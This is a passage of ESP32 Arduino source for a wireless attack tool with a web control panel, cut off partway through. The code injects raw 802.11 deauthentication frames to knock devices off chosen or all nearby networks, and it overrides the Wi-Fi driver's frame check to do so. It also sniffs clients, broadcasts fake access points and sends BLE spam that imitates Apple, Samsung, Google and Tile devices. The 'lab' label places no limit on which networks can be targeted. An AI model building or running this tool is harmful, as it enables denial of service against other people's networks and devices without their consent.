// ============================================================================
//  ESP32 Wi-Fi / BLE Lab - Wi-Fi Death + BLE Death + Auto Dual-Scan
// ============================================================================
//  Features:
//    1. Auto Wi-Fi Network Scan on boot + on demand
//    2. Auto Bluetooth (BLE) Device Scan on boot + on demand
//    3. Wi-Fi Deauthentication (⚡ Wi-Fi Death)
//    4. BLE Advertisement Spam (📡 BLE Death)
//    5. Web UI ( ಹ್ಯಾಕಿಂಗ್ ಲ್ಯಾಬ್ at http://192.168.4.1 )
//    6. Serial Monitor & Web Command Interface
// ============================================================================

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>

#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEClient.h>

// ---------------------------------------------------------------------------
//  Configuration
// ---------------------------------------------------------------------------
#define EDU_ATTACK_MS   30000UL   // Auto-stop after 30 seconds

#define WEB_AP_SSID     "pavan"
#define WEB_AP_PASS     ""        // Open AP - no password
#define WEB_AP_CHANNEL  6

// ---------------------------------------------------------------------------
//  Attack Mode Enum
// ---------------------------------------------------------------------------
enum class AttackMode { IDLE, DEAUTH, DEAUTH_CLIENT, BEACON_SPAM, BLE_SPAM };

// ---------------------------------------------------------------------------
//  BLE Spam Payloads
// ---------------------------------------------------------------------------
static const uint8_t APPLE_DEVICES[][31] = {
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x1f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x00,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};

static const uint8_t NAME_DEVICES[][17] = {
  {0x02,0x01,0x06,0x08,0x09,'A','i','r','P','o','d','s'},
  {0x02,0x01,0x06,0x0d,0x09,'S','a','m','s','u','n','g',' ','B','u','d','s'},
  {0x02,0x01,0x06,0x0d,0x09,'G','a','l','a','x','y',' ','W','a','t','c','h'},
  {0x02,0x01,0x06,0x0b,0x09,'P','i','x','e','l',' ','B','u','d','s'},
  {0x02,0x01,0x06,0x0a,0x09,'M','i',' ','B','a','n','d',' ','7'},
  {0x02,0x01,0x06,0x0c,0x09,'J','B','L',' ','S','p','e','a','k','e','r'},
  {0x02,0x01,0x06,0x0c,0x09,'A','i','r','P','o','d','s',' ','P','r','o'},
  {0x02,0x01,0x06,0x0d,0x09,'G','a','l','a','x','y',' ','B','u','d','s','2'},
  {0x02,0x01,0x06,0x0d,0x09,'X','i','a','o','m','i',' ','W','a','t','c','h'},
  {0x02,0x01,0x06,0x0c,0x09,'M','a','c','B','o','o','k',' ','P','r','o'},
  {0x02,0x01,0x06,0x09,0x09,'S','o','n','y',' ','X','M','4'},
  {0x02,0x01,0x06,0x07,0x09,'i','P','h','o','n','e'},
  {0x02,0x01,0x06,0x0a,0x09,'E','S','P','3','2','-','L','a','b'},
};

// Fixed vendor-format payloads (Samsung SmartThings tag, Google Fast Pair,
// Tile). These are padded to 31 bytes; scanners ignore trailing zero AD data.
static const uint8_t SAMSUNG_TAG[31] = {
  0x02,0x01,0x06,0x03,0x03,0x75,0xfe,0x17,0x16,0x75,0xfe,0x30,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
static const uint8_t GOOGLE_FASTPAIR[31] = {
  0x02,0x01,0x06,0x03,0x03,0x2d,0xfe,0x0e,0x16,0x2d,0xfe,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
static const uint8_t TILE_TAG[31] = {
  0x02,0x01,0x06,0x03,0x03,0xaa,0xfe,0x16,0x16,0xaa,0xfe,0x11,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

struct BleAd {
  const uint8_t* data;
  uint8_t len;
};

static const BleAd VENDOR_DEVICES[] = {
  { SAMSUNG_TAG,     sizeof(SAMSUNG_TAG) },
  { GOOGLE_FASTPAIR, sizeof(GOOGLE_FASTPAIR) },
  { TILE_TAG,        sizeof(TILE_TAG) },
};

// ---------------------------------------------------------------------------
//  Utilities
// ---------------------------------------------------------------------------
inline String macStr(const uint8_t mac[6]) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

inline String jsonEscape(const String& s) {
  String out;
  for (unsigned i = 0; i < s.length(); i++) {
    char c = s.charAt(i);
    if (c == '"' || c == '\\') out += '\\';
    else if (c == '\r') continue;
    else if (c == '\n') out += "\\n";
    else out += c;
  }
  return out;
}

// ---------------------------------------------------------------------------
//  Raw 802.11 Frame Injection (Wi-Fi Deauth)
// ---------------------------------------------------------------------------
extern "C" {
  // Override the ESP-IDF Wi-Fi stack's raw-frame sanity check. Without this,
  // esp_wifi_80211_tx() rejects management frames (deauth = type 0xc0,
  // disassoc = type 0xa0) with "wifi: unsupport frame type: 0c0/0a0" and
  // returns ESP_ERR_INVALID_ARG - on every interface, in every mode, with
  // or without promiscuous mode. Defining this as a STRONG symbol in the
  // sketch makes the linker use ours instead of the copy inside the
  // precompiled libnet80211.a (present in both IDF 4.x and 5.x cores).
  int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3;
    return 0; // allow any raw 802.11 frame to be transmitted
  }
}

static const uint8_t kDeauthTemplate[26] = {
    0xc0, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff,
    0x01, 0x00
};

static const uint8_t kDisassocTemplate[26] = {
    0xa0, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff,
    0x01, 0x00
};

static bool s_injectReady = false;

static void inject_begin(uint8_t channel) {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  s_injectReady = true;
}

static void inject_end() {
  if (s_injectReady) {
    esp_wifi_set_promiscuous(false);
    s_injectReady = false;
  }
}

// Build + transmit a raw 802.11 management frame through the Wi-Fi driver.
static bool inject_raw(const uint8_t* tmpl, const uint8_t ap[6],
                       const uint8_t client[6], uint16_t reason) {
  static uint16_t s_seq = 0;

  uint8_t frame[26];
  memcpy(frame, tmpl, sizeof(frame));
  memcpy(frame + 4,  client, 6);   // DA
  memcpy(frame + 10, ap, 6);       // SA
  memcpy(frame + 16, ap, 6);       // BSSID

  // Sequence control, little-endian, fragment 0. A monotonic sequence
  // number stops receivers from treating repeated bursts as duplicates.
  frame[22] = (uint8_t)((s_seq & 0x0F) << 4);
  frame[23] = (uint8_t)(s_seq >> 4);
  s_seq = (s_seq + 1) & 0x0FFF;

  frame[24] = reason & 0xFF;
  frame[25] = reason >> 8;

  // The softAP interface is active, but a few Arduino cores report an
  // invalid interface for it while promiscuous mode is on, so fall back
  // to the STA interface when the first attempt fails.
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
  if (err != ESP_OK) err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);

  // Under burst load the dynamic TX buffer pool can briefly fill; retry
  // instead of silently dropping the frame.
  for (int i = 0; err == ESP_ERR_NO_MEM && i < 3; i++) {
    delay(3);
    err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    if (err != ESP_OK) err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  }
  return err == ESP_OK;
}

static bool inject_deauth(const uint8_t ap[6], const uint8_t client[6], uint16_t reason) {
  return inject_raw(kDeauthTemplate, ap, client, reason);
}

static bool inject_disassoc(const uint8_t ap[6], const uint8_t client[6], uint16_t reason) {
  return inject_raw(kDisassocTemplate, ap, client, reason);
}

// ---------------------------------------------------------------------------
//  BLE Discovery & Spam Module
// ---------------------------------------------------------------------------
static BLEAdvertising* s_adv = nullptr;
static uint32_t s_lastSwap = 0;
static bool s_bleInited = false;

static const int kMaxBleScan = 32;
static String s_bleNames[kMaxBleScan];
static String s_bleAddrs[kMaxBleScan];
static int s_bleRssi[kMaxBleScan];
static esp_ble_addr_type_t s_bleAddrTypes[kMaxBleScan];
static int s_bleCount = 0;
static volatile bool s_bleScanning = false;

static void ensureBleInit() {
  if (s_bleInited) return;
  BLEDevice::init("ESP32-Lab");
  BLEServer* server = BLEDevice::createServer();
  s_adv = server->getAdvertising();
  s_bleInited = true;
}

#if !defined(ESP_ARDUINO_VERSION_MAJOR) || ESP_ARDUINO_VERSION_MAJOR < 3
// Arduino core 2.x only exposes BLEAdvertisementData::addData(String);
// emulate the (char*, size_t) overload used below with an explicit-length
// String so raw payload bytes (including 0x00) survive.
static void ble_ad_add(BLEAdvertisementData& ad, const void* data, size_t len) {
  ad.addData(std::string((const char*)data, len));
}
#else
static void ble_ad_add(BLEAdvertisementData& ad, const void* data, size_t len) {
  ad.addData((char*)data, len);
}
#endif

static void ble_spam_begin() { s_lastSwap = 0; }

static void ble_spam_tick() {
  if (!s_adv) { ensureBleInit(); }
  uint32_t now = millis();
  if (now - s_lastSwap < 150) return;
  s_lastSwap = now;

  s_adv->stop();

  // Random MAC
  esp_bd_addr_t addr;
  for (int i = 0; i < 6; i++) addr[i] = random(0, 256);
  addr[0] = (addr[0] & 0xFC) | 0x02;
  s_adv->setDeviceAddress(addr, BLE_ADDR_TYPE_RANDOM);

  BLEAdvertisementData adData;
  int type = random(0, 10);
  if (type < 4) {
    const uint8_t* d = APPLE_DEVICES[random(0, sizeof(APPLE_DEVICES) / 31)];
    ble_ad_add(adData, d, 31);
  } else if (type < 7) {
    const uint8_t* d = NAME_DEVICES[random(0, sizeof(NAME_DEVICES) / 17)];
    ble_ad_add(adData, d, 17);
  } else {
    const BleAd& p = VENDOR_DEVICES[random(0, sizeof(VENDOR_DEVICES) / sizeof(BleAd))];
    ble_ad_add(adData, p.data, p.len);
  }
  s_adv->setAdvertisementData(adData);
  s_adv->start();
}

static void ble_spam_end() {
  if (s_adv) s_adv->stop();
}

static void lab_log(const String& msg);

static void bleScanTask(void* pv) {
  s_bleScanning = true;
  ensureBleInit();
  BLEScan* scanner = BLEDevice::getScan();
  scanner->setActiveScan(true);
  scanner->setInterval(100);
  scanner->setWindow(99);
  
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
  BLEScanResults* results = scanner->start(4, false);
  int count = results ? results->getCount() : 0;
  s_bleCount = min(count, kMaxBleScan);
  for (int i = 0; i < s_bleCount; i++) {
    BLEAdvertisedDevice d = results->getDevice(i);
    s_bleNames[i] = d.haveName() ? String(d.getName().c_str()) : String("<Unknown>");
    s_bleAddrs[i] = String(d.getAddress().toString().c_str());
    s_bleRssi[i] = d.getRSSI();
    s_bleAddrTypes[i] = static_cast<esp_ble_addr_type_t>(d.getAddressType());
  }
#else
  BLEScanResults results = scanner->start(4, false);
  int count = results.getCount();
  s_bleCount = min(count, kMaxBleScan);
  for (int i = 0; i < s_bleCount; i++) {
    BLEAdvertisedDevice d = results.getDevice(i);
    s_bleNames[i] = d.haveName() ? String(d.getName().c_str()) : String("<Unknown>");
    s_bleAddrs[i] = String(d.getAddress().toString().c_str());
    s_bleRssi[i] = d.getRSSI();
    s_bleAddrTypes[i] = static_cast<esp_ble_addr_type_t>(d.getAddressType());
  }
#endif

  scanner->clearResults();
  s_bleScanning = false;
  lab_log("BLE scan done: " + String(s_bleCount) + " devices found");
  vTaskDelete(NULL);
}

static void lab_start_ble_scan() {
  if (s_bleScanning) return;
  lab_log("Scanning Bluetooth (BLE) devices...");
  xTaskCreate(bleScanTask, "ble_scan", 4096, NULL, 1, NULL);
}

// ---------------------------------------------------------------------------
//  Web UI HTML
// ---------------------------------------------------------------------------
static const char kIndexHtml[] = R"LABHTML(
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ಹ್ಯಾಕಿಂಗ್ ಲ್ಯಾಬ್</title>
<style>
:root{--bg:#030706;--card:#0a120d;--border:#00ff6644;--glow:#00ff66;--fg:#00ff66;--text:#d1d5db;--red:#ff0055;--red-glow:rgba(255,0,85,0.4);--dim:#00aa44;--cyan:#00e5ff;--blue:#0099ff}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:'Courier New',Courier,monospace}
header{padding:16px 20px;background:linear-gradient(180deg,#0a150e,#030706);border-bottom:1px solid var(--glow);box-shadow:0 0 15px rgba(0,255,102,0.2);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
.title-box h1{margin:0;font-size:26px;color:var(--glow);text-shadow:0 0 10px var(--glow);letter-spacing:1.5px}
.title-box .dev{font-size:13px;color:var(--cyan);margin-top:4px;letter-spacing:1px;text-shadow:0 0 5px var(--cyan);font-weight:bold}
.badge{padding:6px 14px;border-radius:6px;font-size:13px;font-weight:700;border:1px solid;cursor:pointer;user-select:none;transition:all 0.3s}
.badge.on{background:#003311;color:var(--glow);border-color:var(--glow);box-shadow:0 0 10px var(--glow)}
.badge.off{background:#330011;color:var(--red);border-color:var(--red);box-shadow:0 0 10px var(--red-glow)}
main{max-width:900px;margin:0 auto;padding:16px}
.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:14px;box-shadow:0 0 12px rgba(0,255,102,0.08)}
.card h2{margin:0 0 10px;font-size:16px;color:var(--glow);text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--border);padding-bottom:6px;text-shadow:0 0 5px var(--glow)}
.muted{color:#6b7280;font-size:13px}
.row{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:8px 0}
button{padding:8px 16px;border-radius:6px;border:1px solid var(--glow);background:#001a0a;color:var(--glow);font-family:inherit;font-size:13px;cursor:pointer;transition:all 0.2s;text-shadow:0 0 5px var(--glow)}
button:hover{background:#002a14;box-shadow:0 0 10px var(--glow)}
button.blue{border-color:var(--blue);color:var(--blue);background:#001020;text-shadow:0 0 5px var(--blue)}
button.blue:hover{background:#001e38;box-shadow:0 0 10px var(--blue)}
button.stop{border-color:var(--red);color:var(--red);background:#1a0005;text-shadow:0 0 5px var(--red)}
button.stop:hover{background:#2a0008;box-shadow:0 0 10px var(--red)}
table{width:100%;border-collapse:collapse;font-size:13px;margin-top:8px}
th{background:#0a180e;color:var(--glow);padding:6px 8px;text-align:left;border-bottom:1px solid var(--border)}
td{padding:5px 8px;border-bottom:1px solid #0f1f12;color:var(--text)}
select,input[type=text],input[type=number]{background:#0a120d;color:var(--glow);border:1px solid var(--border);border-radius:5px;padding:6px 10px;font-family:inherit;font-size:13px}
.log{background:#010a04;border:1px solid var(--border);border-radius:5px;padding:10px;min-height:90px;max-height:220px;overflow-y:auto;font-size:12px;color:#00cc44;white-space:pre-wrap;word-break:break-all}
.mode-badge{display:inline-block;padding:3px 10px;border-radius:4px;font-size:12px;background:#001a0a;color:var(--glow);border:1px solid var(--border)}
footer{text-align:center;padding:16px;color:#2a4a2a;font-size:12px;border-top:1px solid #0a1a0a}
</style>
</head>
<body>
<header>
  <div class="title-box">
    <h1>ESP32 Wi-Fi / BLE Lab</h1>
    <div class="dev">Developed by Pavan Reddy</div>
  </div>
  <span class="mode-badge" id="modeBadge">IDLE</span>
</header>
<main>
  <!-- Wi-Fi Networks Section -->
  <div class="card">
    <h2>📡 Wi-Fi Networks (Auto-Scanned)</h2>
    <div class="row">
      <button onclick="scanNet()">🔄 Rescan Wi-Fi</button>
      <span id="scanState" class="muted"></span>
    </div>
    <table>
      <thead><tr><th>#</th><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th></tr></thead>
      <tbody id="netTable"><tr><td colspan="5" class="muted">Scanning Wi-Fi networks...</td></tr></tbody>
    </table>
  </div>

  <!-- Connected Clients Section -->
  <div class="card">
    <h2>ðŸ‘¥ Connected Clients</h2>
    <div class="row">
      <button onclick="scanClients()">ðŸ”„ Sniff Clients (12s)</button>
      <span id="clientScanState" class="muted"></span>
    </div>
    <table>
      <thead><tr><th>#</th><th>Client MAC</th><th>Network</th><th>RSSI</th></tr></thead>
      <tbody id="clientTable"><tr><td colspan="4" class="muted">Run a Wi-Fi scan, then click "Sniff Clients" to find connected devices.</td></tr></tbody>
    </table>
  </div>

  <!-- Fake Wi-Fi (Evil Twin) Section -->
  <div class="card">
    <h2>Fake Wi-Fi (Evil Twin)</h2>
    <div class="row">
      <input type="text" id="ssidName" placeholder="Wi-Fi name to broadcast" style="flex:1;min-width:200px">
      <button onclick="setSsid()">Set name</button>
    </div>
    <div class="row">
      <button onclick="startBeacon()">Broadcast 15 fake APs (1 min)</button>
    </div>
    <div id="ssidList" class="muted">No fake AP name set yet.</div>
  </div>

  <!-- Bluetooth (BLE) Devices Section -->

  
  <div class="card">
    <h2>📶 Bluetooth (BLE) Devices (Auto-Scanned)</h2>
    <div class="row">
      <button class="blue" onclick="scanBle()">🔄 Rescan Bluetooth</button>
      <span id="bleScanState" class="muted"></span>
    </div>
    <table>
      <thead><tr><th>#</th><th>Device Name</th><th>MAC Address</th><th>RSSI</th></tr></thead>
      <tbody id="bleTable"><tr><td colspan="4" class="muted">Scanning Bluetooth devices...</td></tr></tbody>
    </table>
  </div>

  <!-- Attack Control Section -->
  <div class="card">
    <h2>⚔️ Attack Control (Lab Use Only)</h2>
    <div class="row">
      <select id="wifiTarget" style="flex:2;min-width:260px">
        <option value="">-- select Wi-Fi network --</option>
      </select>
      <input type="number" id="attackSecs" value="30" min="1" max="300" style="width:90px" title="Attack duration in seconds">
      <span class="muted">sec</span>
    </div>
    <div class="row">
      <select id="clientTarget" style="flex:2;min-width:260px">
        <option value="">-- select client to deauth --</option>
      </select>
      <button onclick="startDeauthClient()">ðŸŽ¯ Deauth Client</button>
    </div>
    <div class="row">
      <button onclick="startDeauth()">⚡ Wi-Fi Death (selected)</button>
      <button onclick="startDeauthAll()">🌐 Deauth All</button>
      <button onclick="startBle()">📡 BLE Death</button>
      <button class="stop" onclick="stopAll()">🛑 Stop</button>
    </div>
    <div id="attackStatus" class="muted">No attack running.</div>
    <div class="muted">Note: the ESP32 has a single radio, so the web UI may
      disconnect while an attack runs. Reconnect after it stops automatically.</div>
  </div>

  <!-- System Log Section -->
  <div class="card">
    <h2>📋 System Log</h2>
    <div id="log" class="log"></div>
  </div>
</main>
<footer>
  ESP32 Wi-Fi &amp; BLE Lab &bull; Developed by Pavan Reddy
</footer>
<script>
let state = {};
const esc = v => String(v ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const poll = async () => {
  try{
    let r = await fetch('/api/state');
    state = await r.json();
    document.getElementById('scanState').textContent = state.wifi_scanning ? 'Scanning Wi-Fi...' : '';
    document.getElementById('bleScanState').textContent = state.ble_scanning ? 'Scanning Bluetooth...' : '';
    document.getElementById('clientScanState').textContent = state.client_scanning ? 'Sniffing for clients...' : '';
    document.getElementById('log').textContent = state.log;
    document.getElementById('modeBadge').textContent = state.mode || 'IDLE';
    document.getElementById('ssidList').textContent = state.beacon_ssid
      ? 'Will broadcast ' + (state.beacon_count || 15) + ' APs: ' + state.beacon_ssid + ', ' + state.beacon_ssid + '-1 ... ' + state.beacon_ssid + '-14'
      : 'No fake AP name set yet.';
    
    // Wi-Fi Table
    let t = document.getElementById('netTable');
    if (state.scan && state.scan.length > 0){
      t.innerHTML = state.scan.map((n,i)=>`<tr><td>${i}</td><td><b>${esc(n.ssid || '<Hidden>')}</b></td><td>${esc(n.bssid)}</td><td>${n.ch}</td><td>${n.rssi} dBm</td></tr>`).join('');
      let wsel = document.getElementById('wifiTarget');
      let wcur = wsel.value;
      wsel.innerHTML = '<option value="">-- select Wi-Fi network --</option>' +
        state.scan.map((n,i)=>`<option value="${i}">${i} · ${esc(n.ssid || '<Hidden>')} (ch ${n.ch})</option>`).join('');
      wsel.value = wcur;
    }
    
    // Clients Table
    let ct = document.getElementById('clientTable');
    let csel = document.getElementById('clientTarget');
    if (state.clients && state.clients.length > 0){
      ct.innerHTML = state.clients.map((c,i)=>`<tr><td>${i}</td><td>${esc(c.mac)}</td><td>${esc(c.ap || '<unassociated>')}</td><td>${c.rssi} dBm</td></tr>`).join('');
      let ccur = csel.value;
      csel.innerHTML = '<option value="">-- select client to deauth --</option>' +
        state.clients.map((c,i)=>`<option value="${i}">${i} Â· ${esc(c.mac)}${c.ap ? ' (' + esc(c.ap) + ')' : ''}</option>`).join('');
      csel.value = ccur;
    } else if (!state.client_scanning) {
      ct.innerHTML = '<tr><td colspan="4" class="muted">No clients captured. Click "Sniff Clients" while devices are active on the target Wi-Fi.</td></tr>';
    }
    
    // Attack status
    let st = document.getElementById('attackStatus');
    if (state.mode && state.mode !== 'idle'){
      st.textContent = state.mode + ' running — ' + state.remaining + 's remaining';
      st.style.color = '#ff0055';
    } else {
      st.textContent = 'No attack running.';
      st.style.color = '';
    }
    
    // BLE Table
    let bt = document.getElementById('bleTable');
    if (state.ble && state.ble.length > 0){
      bt.innerHTML = state.ble.map((d,i)=>`<tr><td>${i}</td><td><b>${esc(d.name)}</b></td><td>${esc(d.addr)}</td><td>${d.rssi} dBm</td></tr>`).join('');
    } else if (!state.ble_scanning) {
      bt.innerHTML = '<tr><td colspan="4" class="muted">No BLE devices in range. Click Rescan Bluetooth to search again.</td></tr>';
    }

  }catch(e){}
};
setInterval(poll, 1500); poll();
const scanNet = async () => { await fetch('/api/scan', {method:'POST'}); poll(); };
const scanBle = async () => { await fetch('/api/blescan', {method:'POST'}); poll(); };
const scanClients = async () => { await fetch('/api/clients', {method:'POST'}); poll(); };
const setSsid = async () => {
  let name = document.getElementById('ssidName').value.trim();
  if (!name){ alert('Enter a Wi-Fi name first.'); return; }
  await fetch('/api/ssid', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams({name})});
  document.getElementById('ssidName').value = '';
  poll();
};
const startBeacon = async () => {
  await fetch('/api/beacon', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams({secs: 60})});
  poll();
};
const attackSecs = () => parseInt(document.getElementById('attackSecs').value || '30', 10);
const startDeauth = async () => {
  let idx = document.getElementById('wifiTarget').value;
  if (idx === ''){ alert('Select a Wi-Fi network first.'); return; }
  await fetch('/api/deauth', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams({idx, secs: attackSecs()})});
  poll();
};
const startDeauthAll = async () => {
  await fetch('/api/deauth', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams({idx: -1, secs: attackSecs()})});
  poll();
};
const startDeauthClient = async () => {
  let idx = document.getElementById('clientTarget').value;
  if (idx === ''){ alert('Select a captured client first. Run "Sniff Clients".'); return; }
  await fetch('/api/deauthc', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams({idx, secs: attackSecs()})});
  poll();
};
const startBle = async () => {
  await fetch('/api/ble', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams({secs: attackSecs()})});
  poll();
};
const stopAll = async () => { await fetch('/api/stop', {method:'POST'}); poll(); };
</script>
</body>
</html>
)LABHTML";

// ---------------------------------------------------------------------------
//  State & Storage
// ---------------------------------------------------------------------------
static AttackMode s_mode = AttackMode::IDLE;
static bool s_armed = false;
static unsigned long s_deadline = 0;
static bool s_wifiScanning = false;

static const int kMaxScan = 32;
static String s_scanSsids[kMaxScan];
static uint8_t s_scanBssids[kMaxScan][6];
static uint8_t s_scanChannels[kMaxScan];
static int s_scanRssi[kMaxScan];
static int s_scanCount = 0;

static const int kMaxClients = 64;
static uint8_t s_clientMacs[kMaxClients][6];
static int8_t s_clientApIdx[kMaxClients];   // index into s_scanBssids, -1 if unknown
static int s_clientRssi[kMaxClients];
static int s_clientCount = 0;

static bool s_clientScanning = false;
static uint32_t s_clientScanStart = 0;
static uint32_t s_lastClientHop = 0;
static uint8_t s_clientScanChannel = 1;
static const uint32_t kClientScanMs = 12000UL;

static uint8_t s_targetClient[6];
static bool s_hasTargetClient = false;

static String s_beaconSsid = "";
static const int kBeaconCount = 15;
static uint8_t s_beaconBssids[kBeaconCount][6];
static String s_beaconNames[kBeaconCount];
static uint8_t s_beaconChannel = 1;
static uint32_t s_lastBeaconHop = 0;
static uint32_t s_lastBeaconTx = 0;
static uint16_t s_beaconSeq = 0;

static const int kLogLines = 30;
static String s_log[kLogLines];
static int s_logHead = 0;
static int s_logCount = 0;

static uint8_t s_targetBssid[6];
static uint8_t s_targetChannel = 0;
static String s_targetSsid;

static const uint8_t kBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

static void lab_log(const String& msg) {
  Serial.println(msg);
  s_log[s_logHead] = msg;
  s_logHead = (s_logHead + 1) % kLogLines;
  if (s_logCount < kLogLines) s_logCount++;
}

static String lab_log_text() {
  String out;
  int start = s_logCount < kLogLines ? 0 : s_logHead;
  for (int i = 0; i < s_logCount; i++) {
    out += s_log[(start + i) % kLogLines];
    out += "\n";
  }
  return out;
}

static const char* modeName(AttackMode m) {
  switch (m) {
    case AttackMode::DEAUTH:   return "DEAUTH";
    case AttackMode::DEAUTH_CLIENT: return "CLIENT DEAUTH";
    case AttackMode::BEACON_SPAM: return "BEACON SPAM";
    case AttackMode::BLE_SPAM: return "BLE SPAM";
    default: return "idle";
  }
}

static void lab_stop() {
  inject_end();
  ble_spam_end();
  s_hasTargetClient = false;
  if (s_clientScanning) {
    s_clientScanning = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
  }
  WiFi.mode(WIFI_OFF);
  delay(50);
  // Restore AP
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  IPAddress ip(192,168,4,1), gw(192,168,4,1), sn(255,255,255,0);
  WiFi.softAPConfig(ip, gw, sn);
  const char* pass = (WEB_AP_PASS[0] && strlen(WEB_AP_PASS) >= 8) ? WEB_AP_PASS : nullptr;
